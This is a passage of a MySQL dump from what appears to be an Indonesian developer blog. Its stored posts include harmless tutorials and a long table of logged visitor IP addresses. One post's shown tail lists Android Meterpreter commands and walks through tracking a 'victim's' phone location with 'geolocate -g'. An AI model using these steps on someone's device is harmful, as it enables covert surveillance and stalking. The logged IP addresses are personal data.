  Hide the app icon from the launcher\r\n    interval_collect  Manage interval collection capabilities\r\n    send_sms          Sends SMS from target session\r\n    set_audio_mode    Set Ringer Mode\r\n    sqlite_query      Query a SQLite database from storage\r\n    wakelock          Enable/Disable Wakelock\r\n    wlan_geolocate    Get current lat-long using WLAN information\r\n\r\n\r\nApplication Controller Commands\r\n===============================\r\n\r\n    Command        Description\r\n    -------        -----------\r\n    app_install    Request to install apk file\r\n    app_list       List installed apps in the device\r\n    app_run        Start Main Activty for package name\r\n    app_uninstall  Request to uninstall application</span></font><font face=\"Rubik, sans-serif\"><span style=\"font-family: \" source=\"\" sans=\"\" pro\";\"=\"\">\r\n</span></font></div><div style=\"color: rgb(33, 37, 41); font-family: Rubik, sans-serif; font-size: 14px; text-align: justify;\"><br></div></code></pre></div><p style=\"margin-bottom: 20px; font-size: 15px; line-height: 28px; color: rgb(122, 131, 139); font-family: Rubik, sans-serif; text-align: justify;\"><span style=\"font-family: \" source=\"\" sans=\"\" pro\";\"=\"\">5. Saat nya kita melacak HP Korban ketik<b> geolocate -g</b></span></p><p style=\"margin-bottom: 20px; font-size: 15px; line-height: 28px; color: rgb(122, 131, 139); font-family: Rubik, sans-serif; text-align: justify;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/msf2.2-min.png\"><span style=\"font-family: \" source=\"\" sans=\"\" pro\";\"=\"\"><b><br></b></span></p><p style=\"margin-bottom: 20px; font-size: 15px; line-height: 28px; color: rgb(122, 131, 139); text-align: justify;\"><font face=\"Source Sans Pro\">6. Copykan yang saya blok, dan pastekan di di Browser kalian</font></p><p style=\"margin-bottom: 20px; font-size: 15px; line-height: 28px; color: rgb(122, 131, 139); text-align: justify;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/msf2.3-min.png\"><font face=\"Source Sans Pro\"><br></font></p><p style=\"margin-bottom: 20px; font-size: 15px; line-height: 28px; color: rgb(122, 131, 139); text-align: justify;\"><font face=\"Source Sans Pro\">nah itulah Posisi Hp yang kita lacak. Mungkin segitunya saja tutorial kali ini .. silahkan share sebanyak2 nya agar apa yang kalian tahu orang lain juga tahu, namun inget jangan di salah gunakan. sekian dan terima kasih.</font></p><p style=\"margin-bottom: 20px; font-size: 15px; line-height: 28px; color: rgb(122, 131, 139); text-align: justify;\"><font face=\"Source Sans Pro\"><br></font></p>', 40, 1, 'de70a284-897a-4a78-882a-95390024bf56', 'artikel', '2020-08-14 11:25:22', '2020-10-04 03:52:34'),
('89e3b48a-f395-4a0d-b5bc-9db57ca67d96', 1, 'Apilikasi E-voting V.01 Berbasis Website Menggunakan Framework Laravel', 'apilikasi-e-voting-v01-berbasis-website-menggunakan-framework-laravel', '1599411887-1597550034-Vote-min.jpg', '<p>                                             </p><p>                                             </p><p>Apilikasi\r\n ini berfungsi untuk pemungutan suara secara online  agar dalam \r\npemilihan suatu kandidat jadi lebih mudah dan efisien berikut tampilan \r\nApilikasi E-voting V.01 ini.</p><p><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot1.png\"><br></p><p style=\"text-align: center;\">Tampilan Home </p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot3.png\"><br></p><p style=\"text-align: center;\">Tampilan Login</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot4.png\"><br></p><p style=\"text-align: center;\">Tampilan Halaman Dashboard<br></p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot5.png\"><br><br>Tampilan Data Kandidat + Tambah Kandidat dengan Modal</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot6.png\"><br><br>Detail Kandidat + Edit Kandidat</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot7.png\"><br><br>Tambah Data Pemilih</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot8.png\"><br><br>Quick Count Real Time</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot9.png\"><br></p><p style=\"text-align: center;\">Tampilan Data User ( Admin + Panitia )</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot10.png\"><br></p><p style=\"text-align: center;\">Tampilan Untuk memilih Kandidat</p><p></p><p style=\"text-align: center;\">Dan jika kalian ingin mengembangkan serta mempelajari apilikasi ini menjadi lebih baik lagi</p><p style=\"text-align: center;\">silahkan Download Link Berikut ini :</p><center><a href=\"http://raboninco.com/10hWi\" class=\"btn btn-primary\">Free Download </a></center><p></p><p></p><center>Dan jika gak mau ribet dan mau tinggal pake saja</center><p></p><p></p><center>silahkan Sewa dengan menggunakan Subdomain kami.</center><p></p><p></p><p></p><p></p><center><a href=\"https://api.whatsapp.com/send?phone=6289615768153&text=Halo%20Saya%20:....%20%20tertarik%20untuk%20menyewa%20Aplikasi%20E-voting%20Anda\" class=\"btn btn-success\">Sewa E-Voting </a></center><p style=\"text-align: center;\"></p><center><a href=\"http://e-voting.spektaweb.com\" class=\"btn btn-info\">Bisa Lihat Disini Websitenya </a></center><br><div style=\"text-align: center;\"><span style=\"font-size: 1rem;\">Terimaksih </span></div><p></p>', 25, 1, 'c5fe72f7-a3ee-4fb1-99c3-0aa919dea785', 'portofolio', '2020-08-12 11:17:05', '2020-09-06 17:04:47'),
('b643214b-2956-4686-9c3a-a17e8be45f97', 1, 'Cara setting lokasi undangan di google maps', 'cara-setting-lokasi-undangan-di-google-maps', 'default.png', '<p>1. Buka<b>&nbsp;<a href=\"https://www.google.co.id/maps\" target=\"_blank\" style=\"\">google maps</a>&nbsp;</b></p><p>2. Cari lokasi rumah / alamat di bagian kolom pencarian</p><p>3. Klik kanan, kemuadian klik \" What\'s here?\"&nbsp; atau \"Ada apa disini?\" maka akan muncul keterangan tempat atau kordinat, tinggal klik saja alamat tersebut</p><p>4. kemudian klik \"share\" atau \"bagikan\" pada menu sebelah kiri</p><p>5. Maka akan muncul sebuah link dan kita tinggal copy link tersebut</p><p>6. kemudian masuk ke dashboard Undangan online tempat kamu menyewa, masukan di menu akad kemuadian paste di kolom peta</p><p>7. selesai</p><p>8. jika bingung silahkan komen / hubungin admin nya. Terimakasih.</p>', 4, 0, 'de70a284-897a-4a78-882a-95390024bf56', 'artikel', '2020-09-14 07:01:39', '2020-09-15 09:32:22'),
('b831b971-f758-49e3-9a13-7fb9d1fba91b', 1, 'Source Code Apilikasi E-Voting Berbasis Web Menggunakan Laravel', 'source-code-apilikasi-e-voting-berbasis-web-menggunakan-laravel', '1599411852-1597550034-Vote-min.jpg', '<p>                                             </p><p>Apilikasi ini berfungsi untuk pemungutan suara secara online  agar dalam pemilihan suatu kandidat jadi lebih mudah dan efisien berikut tampilan Apilikasi E-voting V.01 ini.</p><p><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot1.png\"><br></p><p style=\"text-align: center;\">Tampilan Home </p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot3.png\"><br></p><p style=\"text-align: center;\">Tampilan Login</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot4.png\"><br></p><p style=\"text-align: center;\">Tampilan Halaman Dashboard<br></p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot5.png\"><br><br>Tampilan Data Kandidat + Tambah Kandidat dengan Modal</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot6.png\"><br><br>Detail Kandidat + Edit Kandidat</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot7.png\"><br><br>Tambah Data Pemilih</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot8.png\"><br><br>Quick Count Real Time</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot9.png\"><br></p><p style=\"text-align: center;\">Tampilan Data User ( Admin + Panitia )</p><p style=\"text-align: center;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/evot10.png\"><br></p><p style=\"text-align: center;\">Tampilan Untuk memilih Kandidat</p><p style=\"text-align: center;\">Dan jika kalian ingin mengembangkan serta mempelajari apilikasi ini menjadi lebih baik lagi</p><p style=\"text-align: center;\">silahkan Download Link Berikut ini :</p><center><a href=\"http://raboninco.com/10hWi\" class=\"btn btn-primary\">Free Download </a></center><p></p><p></p><center>Dan jika gak mau ribet dan mau tinggal pake saja</center><p></p><p></p><center>silahkan Sewa dengan menggunakan Subdomain kami.</center><p></p><p></p><p></p><p></p><center><a href=\"https://api.whatsapp.com/send?phone=6289615768153&text=Halo%20Saya%20:....%20%20tertarik%20untuk%20menyewa%20Aplikasi%20E-voting%20Anda\" class=\"btn btn-success\">Sewa E-Voting </a></center><p style=\"text-align: center;\"></p><center><a href=\"http://e-voting.spektaweb.com\" class=\"btn btn-info\">Bisa Lihat Disini Websitenya </a></center><br><div style=\"text-align: center;\"><span style=\"font-size: 1rem;\">Terimaksih </span></div><p></p>\r\n                                            <p></p>', 192, 1, '73549ed6-bfd6-4a20-bcea-c65b2354057f', 'artikel', '2020-08-14 23:00:55', '2020-10-06 08:08:51'),
('c2fc38ab-47bc-4ce9-ad41-ddf8c8242c49', 1, 'SpektaWeb - Blog & Portofolio', 'spektaweb-blog-portofolio', '1598664778-spek.png', '<p>Website Portofolio dan BLog Personal :</p><p>Fitur <span style=\"font-size: 1rem;\">Admin :</span></p><p>- Kelola Artikel</p><p>- Kelola Portofolio</p><p>- Kelola Kategori</p><p>- Login & Logout</p><p>- Tambah User</p><p>- Lihat dan Balas Komentar</p><p>- Lihat Kontak Masuk</p><p>- Menampilkan Ip Visitor ( 1 Ip/day )</p><p>- Template Frontend ( <a href=\"https://colorlib.com/\" target=\"_blank\"><b>colorlib</b></a> )</p><p>- Template Backend ( <a href=\"https://spektaweb.com/posts/menggabungkan-laravel-dengan-adminlte-kurang-dari-5-menit\" target=\"_blank\" style=\"\"><b>AdminLTE3</b></a><b> </b>)</p>\r\n<center><a href=\"https://www.youtube.com/watch?v=9pUBnPutSy8&t=398s\" class=\"btn btn-danger\"> Untuk Fitur Backend Silahkan Lihat disini</a></center>', 33, 1, '5288c5e0-acea-470e-ae3a-5816a184c0eb', 'portofolio', '2020-08-29 01:11:02', '2020-10-03 05:03:18'),
('cc9183d3-3c21-4865-9725-e7f1834b417a', 1, 'Alasan Kenapa Visual Studio Code Menjadi Pilihan Terbaik Untuk Ngoding Laravel', 'alasan-kenapa-visual-studio-code-menjadi-pilihan-terbaik-untuk-ngoding-laravel', '1599412398-1597552963-visual-min.png', '<div style=\"text-align: justify; \"><span style=\"font-size: 1rem;\">Visual Studio Code adalah kode editor yang dikembangkan oleh Microsoft untuk Windows, Linux dan macOS. Ini adalah Kode Editor super cepat dan ringan yang dapat digunakan untuk view, edit, run dan men-debug kode. Admin sendiri adalah pengguna VsCode, selain kemudahan dalam ngoding banyak juga fitur-fitur yang tersedia di dalam nya. Berikut Alasan Admin memilih Visual Studio Code sebagai text editor :</span><br></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\"><span style=\"font-family: \" courier=\"\" new\";\"=\"\">1. GRATIS</span></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\"><span style=\"font-family: \" courier=\"\" new\";\"=\"\">Ya benar, dengan segala fitur dan kemudahan nya, alasan pertama saya memilih menggunakan Visual Studio Code karena GRATIS alias tidak bayar hehe. Berbeda dengan Sublime atau Php Storm yang berbayar untuk mendapat fitur yang mumpuni.</span></div><div style=\"text-align: justify;\"><span style=\"font-family: \" courier=\"\" new\";\"=\"\"><br></span></div><div style=\"text-align: justify;\"><img src=\"https://kelarjosari.malangkota.go.id/wp-content/uploads/sites/51/2015/07/Gratis.png\" style=\"width: 100%;\"><span style=\"font-family: \" courier=\"\" new\";\"=\"\"><br></span></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\"><span style=\"font-family: \" courier=\"\" new\";\"=\"\">2. EKTENSI LARAVEL</span></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\"><span style=\"font-family: \" courier=\"\" new\";\"=\"\">Di Visual Studio Code banyak sekali ektensi yang dapat kita install untuk mempermudah ngoding laravel kita, contoh nya seperti Laravel artisan, Laravel Blade Snippets, Laravel Blade Spacer dll, Ok untuk point no 2 ini nanti saya akan membuat artikel secara terpisah agar lebih jelas dan mudah di mengerti. atau kalian bisa klik tautan ini untuk melihat lebih detailnya bisa dilihat di link berikut <b> </b></span><a href=\"https://marketplace.visualstudio.com/search?term=laravel&target=VSCode&category=All%20categories&sortBy=Relevance\" target=\"_blank\"><b>Laravel Extension</b></a><b><br></b><br></div><div style=\"text-align: justify;\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/extensi.png\"><br></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\"><a href=\"https://marketplace.visualstudio.com/search?term=laravel&target=VSCode&category=All%20categories&sortBy=Relevance\" target=\"_blank\"> </a></div><div style=\"text-align: justify;\"><span style=\"font-size: 1rem;\">3. TAMPILAN YANG CANTIK DAN ELEGEAN</span><br></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify; \"><span style=\"font-family: \" courier=\"\" new\";\"=\"\">Di Visual Studio Code kita dapat merubah tema sesuai keinginan kita, dan Tema Kesukaan admin adalah  </span><a href=\"https://marketplace.visualstudio.com/items?itemName=zhuangtongfa.Material-theme\" target=\"_blank\"><b>One Dark Pro</b></a><br><br></div><div style=\"text-align: justify; \"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/onedark.png\"><br></div><div style=\"text-align: justify; \"><span style=\"font-family: \" courier=\"\" new\";\"=\"\"><br>yah mungkin segitu saja ulasan dari admin, apabila kalian tidak setuju atau apapun itu silahkan utarakan pemikiran kalian di kolom komen. Sekian dan terimakasih.</span></div><div style=\"text-align: justify; \"><br></div>', 32, 1, '35e961a8-56b7-4fa4-bb08-77d0d3e86c77', 'artikel', '2020-08-11 12:56:21', '2020-09-28 03:38:59'),
('de74e8e7-344a-4dea-bf7d-4d26f1a3b4bd', 1, 'Free Downlaod AdminLTE 3 Untuk Laravel Siap Pakai', 'free-downlaod-adminlte-3-untuk-laravel-siap-pakai', '1599412225-1597581678-adminlte2-min.png', '<div align=\"justify\"><b>AdminLTE 3 Untuk Laravel Siap Pakai  -</b> Hallo semuanya, kali ini saya akan membagikan sebuah template yaitu AdminLTE 3 , template ini sudah siap pakai untuk project laravel kita, karena sudah saya modif sedemikian rupa sehingga mempermudah menggabungkannya dengan project laravel, contohnya seperti <b>SweetAlert, Reload Page, Button Hapus with Modal</b>, berikut juga settingan untuk<b> layouts</b>, ditambah <b>Kerangka View</b>, serta halaman <b>Login.</b></div><div align=\"justify\"><b><br></b></div><div align=\"justify\"><img style=\"width: 100%;\" src=\"https://spektaweb.com/artikel/adminlte1.png\"><b><br></b></div><div align=\"justify\">untuk tutorial pemasangan nya nantikan di Channel Youtube Saya. </div><div align=\"justify\"><br></div><div align=\"justify\"><div align=\"center\">Link Download :<br></div><br></div><center><a href=\"http://raboninco.com/1mMwk\" class=\"btn btn-primary\" target=\"_blank\"> Download</a></center>', 79, 1, '35e961a8-56b7-4fa4-bb08-77d0d3e86c77', 'artikel', '2020-08-16 12:24:55', '2020-10-03 17:15:49'),
('f8472b41-1b23-43a5-a03e-1979242bbe21', 1, 'Belajar Arduino tanpa harus Punya Arduino ! Begini Caranya ..', 'belajar-arduino-tanpa-harus-punya-arduino-begini-caranya', '1599411508-1597751183-tinker3-min.png', '<div style=\"text-align: justify;\"><b style=\"font-size: 1rem;\">Belajar Arduino tanpa harus Punya Arduino ! Begini Caranya .. - </b><span style=\"font-size: 1rem;\">Hallo semuanya di artikel sebelum nya saya telah membagikan link untuk mendownload<b><u> </u></b></span><a href=\"https://spektaweb.com/posts/e-book-arduino-gratis-untuk-pemula-bisa-langsung-praktek\" target=\"_blank\" style=\"\"><b><u>E-book Arduino GRATIS Untuk Pemula ! Bisa Langsung Praktek</u></b></a><b> </b>kali ini saya akan memberitahu bagaimana caranya kita belajar arduino tanpa harus punya arduino. Penasaran Bagaimana Caranya? </div><div style=\"text-align: justify;\">cekidot ...</div><div style=\"text-align: justify;\">Seringkali kita terhambat oleh biaya untuk belajar / praktek langsung arduino, namun di zaman sekarang dimana teknologi sudah semakin canggih kita bisa belajar simulasi langsung secara online menggunakan jasa - jasa website yang menyedikan simulasi online contohnya<u><b> </b><a href=\"https://www.tinkercad.com/\" target=\"_blank\"><b>https://www.tinkercad.com/</b></a></u><b><a href=\"https://www.tinkercad.com/\" target=\"_blank\"></a></b></div><div style=\"text-align: justify;\"><b><br></b></div><div style=\"text-align: justify;\"><img src=\"https://spektaweb.com/artikel/tinker1.png\" style=\"width: 100%;\"><b><br></b></div><div style=\"text-align: justify;\"><b><br></b></div><div style=\"text-align: justify;\">di website ini kalian bisa belajar simulasi arduino beserta codingan nya juga, untuk komponen -komponen nya juga dirasa sangat cukup dan sangat cocok UNTUK PEMULA seperti saya. Silahkan kalian kunjungi website tersebut, kemudian kalian daftar atau login menggunakan akun Google kalian.</div><div style=\"text-align: justify;\">Contoh nya disni saya mencoba membuat rangkaian simulasi lampu lalu lintas berikut juga codingan nya ..</div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\"><img src=\"https://spektaweb.com/artikel/tinker2.png\" style=\"width: 100%;\"></div><div style=\"text-align: justify;\"><br></div><div style=\"text-align: justify;\">jika kalian bingung bagaimana cara nya .. nantikan di channel <a href=\"https://www.youtube.com/channel/UCtJgeoErowzSoAAd64xPzvQ\" target=\"_blank\" style=\"\"><b><u>YOUTUBE</u></b></a><b> </b>saya. Terimakasih.</div>', 12, 1, '34b95916-fe6e-4a1a-99b3-ffc621f75a10', 'artikel', '2020-08-18 11:45:55', '2020-09-26 15:14:47');

-- --------------------------------------------------------

--
-- Table structure for table `tb_subscriber`
--

CREATE TABLE `tb_subscriber` (
  `id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `tb_visitor`
--

CREATE TABLE `tb_visitor` (
  `id` int(10) UNSIGNED NOT NULL,
  `ip_visitor` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tb_visitor`
--

INSERT INTO `tb_visitor` (`id`, `ip_visitor`, `created_at`, `updated_at`) VALUES
(64, '2.236.112.207', '2020-08-10 14:12:20', NULL),
(65, '128.90.20.167', '2020-08-10 15:26:22', NULL),
(67, '140.213.5.140', '2020-08-11 13:12:42', NULL),
(68, '121.36.137.19', '2020-08-11 13:16:19', NULL),
(69, '114.124.172.133', '2020-08-11 13:16:38', NULL),
(70, '114.124.161.140', '2020-08-11 13:21:23', NULL),
(72, '121.36.137.19', '2020-08-11 17:31:12', NULL),
(73, '74.72.155.205', '2020-08-11 20:27:06', NULL),
(74, '172.105.38.181', '2020-08-11 20:59:02', NULL),
(76, '66.249.71.69', '2020-08-11 22:23:47', NULL),
(77, '66.249.79.132', '2020-08-11 22:25:29', NULL),
(78, '66.249.71.94', '2020-08-11 22:33:44', NULL),
(80, '20.42.94.181', '2020-08-11 22:49:25', NULL),
(81, '2.236.112.207', '2020-08-11 23:58:26', NULL),
(82, '114.124.161.136', '2020-08-12 00:54:34', NULL),
(83, '65.154.226.100', '2020-08-12 10:26:47', NULL),
(84, '103.105.34.76', '2020-08-12 11:17:13', NULL),
(85, '114.124.212.197', '2020-08-12 11:37:27', NULL),
(86, '114.124.214.245', '2020-08-12 11:38:04', NULL),
(87, '3.249.205.186', '2020-08-12 12:02:12', NULL),
(88, '173.252.83.119', '2020-08-12 13:22:19', NULL),
(89, '103.105.34.102', '2020-08-12 13:22:48', NULL),
(90, '173.252.87.20', '2020-08-12 13:25:14', NULL),
(91, '66.249.71.66', '2020-08-12 13:38:59', NULL),
(92, '114.142.172.41', '2020-08-12 14:14:00', NULL),
(93, '66.249.79.158', '2020-08-12 15:38:21', NULL),
(94, '36.78.202.146', '2020-08-12 17:09:06', NULL),
(95, '66.249.71.68', '2020-08-12 20:41:39', NULL),
(96, '34.68.160.197', '2020-08-12 20:51:24', NULL),
(97, '66.249.71.65', '2020-08-12 21:00:09', NULL),
(98, '165.227.252.43', '2020-08-12 21:26:29', NULL),
(99, '103.87.78.122', '2020-08-12 21:40:10', NULL),
(100, '112.215.210.179', '2020-08-12 22:11:41', NULL),
(101, '116.206.14.16', '2020-08-12 22:43:06', NULL),
(102, '34.223.82.66', '2020-08-12 23:07:35', NULL),
(103, '54.202.87.215', '2020-08-12 23:13:22', NULL),
(104, '40.76.35.32', '2020-08-13 00:50:44', NULL),
(105, '103.105.33.124', '2020-08-13 08:15:32', NULL),
(106, '103.105.33.102', '2020-08-13 11:41:08', NULL),
(107, '66.249.82.99', '2020-08-13 12:09:22', NULL),
(108, '66.249.82.96', '2020-08-13 12:09:22', NULL),
(109, '66.249.82.126', '2020-08-13 12:09:24', NULL),
(110, '103.105.34.82', '2020-08-13 12:13:12', NULL),
(111, '140.213.15.189', '2020-08-13 12:15:46', NULL),
(112, '66.249.82.127', '2020-08-13 12:38:46', NULL),
(113, '51.15.229.10', '2020-08-13 13:02:17', NULL),
(114, '51.158.116.66', '2020-08-13 13:02:37', NULL),
(115, '163.172.129.138', '2020-08-13 13:02:37', NULL),
(116, '51.158.106.132', '2020-08-13 13:02:38', NULL),
(117, '66.102.9.160', '2020-08-13 13:10:18', NULL),
(118, '66.102.9.190', '2020-08-13 13:10:23', NULL),
(119, '66.102.9.163', '2020-08-13 13:10:27', NULL),
(120, '66.102.6.126', '2020-08-13 13:39:43', NULL),
(121, '35.238.167.191', '2020-08-13 17:31:26', NULL),
(122, '52.14.147.239', '2020-08-13 17:51:00', NULL),
(123, '222.79.44.67', '2020-08-13 19:56:41', NULL),
(124, '182.1.61.230', '2020-08-13 20:04:14', NULL),
(125, '171.13.14.44', '2020-08-13 21:42:33', NULL),
(126, '171.13.14.16', '2020-08-13 21:44:01', NULL),
(127, '103.105.34.64', '2020-08-13 22:05:33', NULL),
(128, '182.1.60.122', '2020-08-14 01:31:49', NULL),
(129, '101.4.60.64', '2020-08-14 04:00:04', NULL),
(130, '180.163.220.67', '2020-08-14 04:00:21', NULL),
(131, '123.125.53.52', '2020-08-14 04:10:03', NULL),
(132, '72.13.46.6', '2020-08-14 05:16:33', NULL),
(133, '36.85.3.193', '2020-08-14 07:55:27', NULL),
(134, '66.249.71.72', '2020-08-14 08:34:38', NULL),
(135, '103.105.33.73', '2020-08-14 10:52:06', NULL),
(136, '221.229.218.152', '2020-08-14 11:28:30', NULL),
(137, '110.138.128.208', '2020-08-14 11:58:14', NULL),
(138, '114.142.172.32', '2020-08-14 12:04:58', NULL),
(139, '182.0.228.47', '2020-08-14 12:06:36', NULL),
(140, '66.249.79.159', '2020-08-14 13:12:14', NULL),
(141, '116.206.15.3', '2020-08-14 14:51:24', NULL),
(142, '103.105.33.116', '2020-08-14 22:44:39', NULL),
(143, '118.31.108.6', '2020-08-15 00:32:21', NULL),
(144, '47.75.219.87', '2020-08-15 00:33:55', NULL),
(145, '65.154.226.109', '2020-08-15 00:55:09', NULL),
(146, '66.249.71.81', '2020-08-15 01:06:56', NULL),
(147, '66.249.83.215', '2020-08-15 01:41:59', NULL),
(148, '103.105.34.94', '2020-08-15 02:02:51', NULL),
(149, '140.213.23.73', '2020-08-15 02:04:46', NULL),
(150, '103.105.34.122', '2020-08-15 02:12:04', NULL),
(151, '38.111.213.152', '2020-08-15 02:51:19', NULL),
(152, '103.105.33.67', '2020-08-15 05:12:46', NULL),
(153, '38.111.215.62', '2020-08-15 05:13:30', NULL),
(154, '38.111.214.83', '2020-08-15 05:15:20', NULL),
(155, '38.111.214.93', '2020-08-15 05:53:47', NULL),
(156, '103.105.34.89', '2020-08-15 07:31:18', NULL),
(157, '38.111.215.251', '2020-08-15 07:37:05', NULL),
(158, '208.80.194.41', '2020-08-15 07:55:15', NULL),
(159, '116.206.15.7', '2020-08-15 11:35:10', NULL),
(160, '47.88.62.149', '2020-08-15 12:21:59', NULL),
(161, '47.108.71.201', '2020-08-15 13:05:01', NULL),
(162, '116.206.14.10', '2020-08-15 13:07:47', NULL),
(163, '140.213.24.195', '2020-08-15 13:27:40', NULL),
(164, '140.213.22.239', '2020-08-15 13:36:07', NULL),
(165, '196.196.85.196', '2020-08-15 20:46:50', NULL),
(166, '116.206.15.10', '2020-08-15 23:16:35', NULL),
(167, '140.213.22.223', '2020-08-15 23:56:32', NULL),
(168, '46.4.250.50', '2020-08-16 01:39:03', NULL),
(169, '46.4.250.49', '2020-08-16 01:45:19', NULL),
(170, '38.111.213.153', '2020-08-16 02:03:13', NULL),
(171, '114.142.173.35', '2020-08-16 02:04:14', NULL),
(172, '140.213.19.241', '2020-08-16 02:09:03', NULL),
(173, '38.111.213.149', '2020-08-16 02:11:43', NULL),
(174, '116.206.14.6', '2020-08-16 02:17:31', NULL),
(175, '114.142.172.52', '2020-08-16 02:20:55', NULL),
(176, '38.111.213.148', '2020-08-16 03:58:03', NULL),
(177, '114.142.172.11', '2020-08-16 04:27:19', NULL),
(178, '66.249.82.111', '2020-08-16 04:32:02', NULL),
(179, '66.249.82.115', '2020-08-16 04:32:02', NULL),
(180, '66.249.82.113', '2020-08-16 04:32:07', NULL),
(181, '38.111.215.62', '2020-08-16 04:44:22', NULL),
(182, '66.249.79.151', '2020-08-16 05:30:07', NULL),
(183, '66.220.149.30', '2020-08-16 05:41:26', NULL),
(184, '66.220.149.119', '2020-08-16 05:41:26', NULL),
(185, '66.220.149.24', '2020-08-16 05:41:27', NULL),
(186, '66.220.149.21', '2020-08-16 05:41:28', NULL),
(187, '66.220.149.3', '2020-08-16 05:41:33', NULL),
(188, '38.111.214.82', '2020-08-16 07:06:44', NULL),
(189, '27.115.124.6', '2020-08-16 07:22:32', NULL),
(190, '180.163.220.4', '2020-08-16 07:22:59', NULL),
(191, '65.154.226.109', '2020-08-16 08:34:17', NULL),
(192, '115.178.195.196', '2020-08-16 09:18:48', NULL),
(193, '180.163.220.68', '2020-08-16 09:33:05', NULL),
(194, '42.236.10.125', '2020-08-16 09:33:08', NULL),
(195, '66.249.71.79', '2020-08-16 11:38:42', NULL),
(196, '116.206.14.5', '2020-08-16 11:58:12', NULL),
(197, '116.206.15.23', '2020-08-16 12:25:01', NULL),
(198, '38.111.213.152', '2020-08-16 12:27:08', NULL),
(199, '118.99.104.15', '2020-08-16 12:48:05', NULL),
(200, '54.36.148.59', '2020-08-16 19:21:43', NULL),
(201, '66.220.149.119', '2020-08-16 19:29:41', NULL),
(202, '116.206.15.54', '2020-08-16 22:27:14', NULL),
(203, '63.246.143.146', '2020-08-16 23:01:48', NULL),
(204, '66.220.149.20', '2020-08-17 00:09:09', NULL),
(205, '114.142.172.34', '2020-08-17 00:35:50', NULL),
(206, '140.213.23.247', '2020-08-17 01:58:03', NULL),
(207, '54.36.148.153', '2020-08-17 02:28:40', NULL),
(208, '116.206.15.16', '2020-08-17 02:49:21', NULL),
(209, '23.29.125.178', '2020-08-17 02:55:31', NULL),
(210, '173.252.95.19', '2020-08-17 05:58:10', NULL),
(211, '54.36.148.78', '2020-08-17 06:23:14', NULL),
(212, '114.142.173.29', '2020-08-17 07:06:38', NULL),
(213, '66.249.79.151', '2020-08-17 07:08:03', NULL),
(214, '173.252.87.19', '2020-08-17 08:00:03', NULL),
(215, '116.206.15.56', '2020-08-17 08:24:07', NULL),
(216, '140.213.24.144', '2020-08-17 10:12:09', NULL),
(217, '140.213.0.12', '2020-08-17 10:38:11', NULL),
(218, '51.158.101.81', '2020-08-17 11:10:11', NULL),
(219, '54.36.148.169', '2020-08-17 11:51:24', NULL),
(220, '66.249.71.79', '2020-08-17 12:10:44', NULL),
(221, '103.105.33.87', '2020-08-17 12:36:19', NULL),
(222, '66.249.71.83', '2020-08-17 12:59:15', NULL),
(223, '138.246.253.15', '2020-08-18 01:50:37', NULL),
(224, '36.80.162.71', '2020-08-18 05:05:48', NULL),
(225, '36.81.10.14', '2020-08-18 05:23:52', NULL),
(226, '66.249.88.242', '2020-08-18 05:27:43', NULL),
(227, '66.249.88.238', '2020-08-18 05:27:50', NULL),
(228, '42.83.147.202', '2020-08-18 07:37:45', NULL),
(229, '66.249.83.215', '2020-08-18 07:58:27', NULL),
(230, '180.163.220.68', '2020-08-18 08:26:21', NULL),
(231, '42.236.10.125', '2020-08-18 08:27:57', NULL),
(232, '42.236.10.93', '2020-08-18 08:28:09', NULL),
(233, '118.99.104.15', '2020-08-18 09:25:55', NULL),
(234, '173.252.95.25', '2020-08-18 10:41:47', NULL),
(235, '27.115.124.6', '2020-08-18 11:00:38', NULL),
(236, '114.142.172.47', '2020-08-18 11:02:02', NULL),
(237, '180.163.220.66', '2020-08-18 11:35:43', NULL),
(238, '103.105.34.92', '2020-08-18 12:33:30', NULL),
(239, '173.252.79.22', '2020-08-18 13:04:10', NULL),
